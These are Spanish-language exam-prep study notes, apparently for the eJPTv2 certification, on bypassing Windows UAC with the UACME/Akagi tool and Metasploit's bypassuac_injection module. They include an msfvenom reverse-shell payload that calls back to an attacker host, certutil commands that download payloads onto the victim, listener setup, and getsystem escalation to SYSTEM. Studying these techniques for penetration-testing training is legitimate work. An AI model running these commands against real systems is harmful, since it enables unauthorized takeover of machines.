El **UAC** es un componente de seguridad de Windows que ayuda a prevenir cambios no autorizados en el sistema operativo. Cuando un usuario intenta ejecutar una tarea que requiere privilegios elevados, Windows muestra un aviso solicitando permiso. 
Cuando un programa requiere privilegios de administrador, el UAC muestra una ventana de confirmación al usuario.

![[Imagenes/UACExample.png]]

El "Bypass" consiste en engañar al sistema para que ejecute nuestro proceso malicioso con privilegios elevados sin que el usuario vea (o necesite aceptar) ese aviso.

Si hemos comprometido a un usuario que es administrador pero su sesión actual es de "privilegios limitados", necesitamos esta técnica para obtener una shell como **SYSTEM**.
## 🛠️ Herramienta: UACME (Akagi)

**UACME** es una herramienta de código abierto que contiene una colección de métodos para saltarse el control de cuentas de usuario mediante el aprovechamiento de debilidades en el propio diseño de Windows.

- **Repositorio original (Documentación):** [UACME (GitHub)](https://github.com/hfiref0x/UACME)
- **Repositorio de binarios (eJPTv2):** [Akagi.exe (GitHub)](https://github.com/yuyudhn/UACME-bin/tree/main)
### 🚀 Metodología Paso a Paso
### 0. Clonamos el repo

- `git clone https://github.com/yuyudhn/UACME-bin/blob/main/Akagi64.exe` _(Uso el segundo repo ya que es ahí donde se encuentra el binario de akagi32/64.exe)_
### 1. Preparación del Payload
Primero, generamos un binario malicioso que nos devuelva una shell con [[Msfvenom]].

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=<TU_PUERTO> -f exe > shell_reversa.exe`
### 2. Transferencia de Archivos al Objetivo
Debes subir tanto el binario de **Akagi** (32 o 64 bits según el objetivo) como tu **payload** generado.

- **Desde Kali (Servidor):** `python3 -m http.server <TU_PUERTO>`
- **Desde la Víctima (Descarga):**
	- `certutil -urlcache -f http://<TU_IP>/<TU_PUERTO>shell_reversa.exe shell_reversa.exe`
	- `certutil -urlcache -f http://<TU_IP>/<TU_PUERTO>Akagi64.exe Akagi64.exe`

- **O mediante Meterpreter:** `upload /ruta/local/archivos/shell_reversa.exe`
### 3. Configuración del Listener
En tu Metasploit, prepara el receptor para la nueva shell con privilegios elevados:

- `use exploit/multi/handler`
- `set payload windows/meterpreter/reverse_tcp` (debe coincidir con el de msfvenom)
- `set LHOST` y `LPORT`
- `run -j` (para dejarlo en segundo plano, opcional)
_(Lo hacemos con el multi handler, ya que en el ejemplo, el payload generado es para crear una sesión de meterpreter)_
### 4. Ejecución del Bypass (En el sistema víctima)
Para ejecutar Akagi, necesitamos especificar una **Key** (ID de la técnica) y la ruta completa de nuestro payload.

- `.\Akagi64.exe <Key> C:\ruta\shell_reversa.exe`

> [!important] **Sobre las Keys:** Las Keys son números que representan diferentes métodos de bypass. Debes consultar el [README de UACME](https://github.com/hfiref0x/UACME) en la sección "Keys" para elegir la adecuada según la versión de Windows (ej. la Key **23** o **34** son muy comunes). También aparece info si la Key ha sido fixeada o no.
### 🚩 Resultado
Si la técnica tiene éxito, recibirás una nueva conexión en tu _multi/handler_. Al ejecutar el comando `getuid` o `whoami` en esta nueva sesión, verás que ahora tienes privilegios de **NT AUTHORITY\SYSTEM**.

### 📑 Notas para el Examen eJPTv2

- **Identificación del sistema:** Antes de lanzar cualquier `Key`, asegúrate de conocer la versión exacta de Windows (`systeminfo`). No todas las técnicas funcionan en todas las versiones.
- **Privilegios obtenidos:** Al ejecutarse con éxito, el proceso hijo (`reverse_shell.exe`) heredará los privilegios elevados, dándote una sesión de Meterpreter con permisos `SYSTEM`.
- **Discreción:** Algunas técnicas de UACME dejan rastros en el registro o crean procesos temporales que pueden ser detectados por soluciones EDR modernas si el sistema no está totalmente desprotegido.

## 🛡️ Bypass UAC (Metasploit)
### 🛠️ Requisitos Previos

1. Una sesión de **Meterpreter** activa (aunque sea de bajos privilegios).
2. Que el usuario víctima pertenezca al grupo de **Administradores**, pero su token esté filtrado por el UAC (común en instalaciones por defecto).
### 🚀 Paso a Paso: Bypass UAC Injection
Utilizaremos una técnica de inyección de memoria para saltarnos la restricción sin dejar rastros en el disco.
### 1. Selección del Módulo
Modulo: `exploit/windows/local/bypassuac_injection`
### 2. Configuración de Parámetros
Es fundamental configurar correctamente la sesión actual y un puerto libre para la nueva sesión privilegiada.

| **Comando**                                           | **Descripción**                                                                 |
| ----------------------------------------------------- | ------------------------------------------------------------------------------- |
| **`set SESSION <ID>`**                                | El ID de tu sesión de Meterpreter actual (ver con `sessions`).                  |
| **`set PAYLOAD windows/x64/meterpreter/reverse_tcp`** | Definimos el payload para la nueva sesión (debe coincidir con la arquitectura). |
| **`set LPORT <PUERTO>`**                              | **CRÍTICO:** Debe ser un puerto distinto al de la sesión actual.                |
| **`set TARGET <ID>`**                                 | Seleccionamos la arquitectura del objetivo (0 para x86, 1 para x64).            |
| `run` o `exploit`                                     | Ejecutar el exploit                                                             |

### ⚡ Paso Final: De Administrador a SYSTEM
Una vez que el exploit tiene éxito, Metasploit abrirá una **nueva sesión** de Meterpreter. En esta sesión, el UAC ya no nos bloquea, pero seguimos siendo el usuario original (con privilegios de administrador "desbloqueados").

Para obtener el máximo nivel de privilegios en Windows (`NT AUTHORITY\SYSTEM`), usamos las herramientas integradas de Meterpreter:

1. **Verificar usuario actual:** `getuid`
2. **Intentar escalada automática:** `getsystem`
3. **Confirmar éxito:** `getuid` (Debería devolver `NT AUTHORITY\SYSTEM`).

> [!tip] **¿Por qué usar getsystem?** El comando `getsystem` utiliza varias técnicas (como la suplantación de tokens o el uso de pipes con nombre) para pasar de un usuario Administrador a la cuenta de sistema, permitiéndote control total sobre el kernel y la base de datos SAM.
### 🚩 Solución de Problemas

- **Arquitectura:** Si el objetivo es x64 pero usas un payload x86, el exploit podría fallar o la sesión ser inestable. Verifica siempre con el comando `sysinfo` en la sesión inicial.
- **Puerto ocupado:** Si olvidas cambiar el `LPORT`, la conexión de retorno fallará porque el puerto ya está siendo escuchado por tu primera sesión.

##
---
**Navegación:**
- Volver a: [[3.2 Escalada de Privilegios en Windows]]
- [[Técnicas]]